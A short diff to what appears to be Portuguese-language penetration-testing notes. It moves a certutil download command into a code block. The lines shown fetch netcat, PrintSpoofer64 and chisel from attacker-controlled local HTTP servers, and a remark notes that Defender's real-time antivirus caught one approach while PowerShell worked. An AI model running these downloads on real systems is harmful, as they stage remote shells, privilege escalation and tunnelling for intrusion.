@@ -102,7 +102,9 @@ Apartir deste script a gente consegue
 
 OBS: Esse cara complicou a vida por conta do AV Defender em tempo real... Foi pego. do powershell funciona normalmente
 
-    certutil -urlcache -split -f "http://192.168.0.253:8000/nc.cmd" nc.hex
+```
+certutil -urlcache -split -f "http://192.168.0.253:8000/nc.cmd" nc.hex
+```
     
     certutil -urlcache -split -f "http://192.168.49.120:8000/PrintSpoofer64.exe" ps64.exe
     certutil -urlcache -split -f "http://192.168.49.120:8000/chisel.exe" chisel.exe
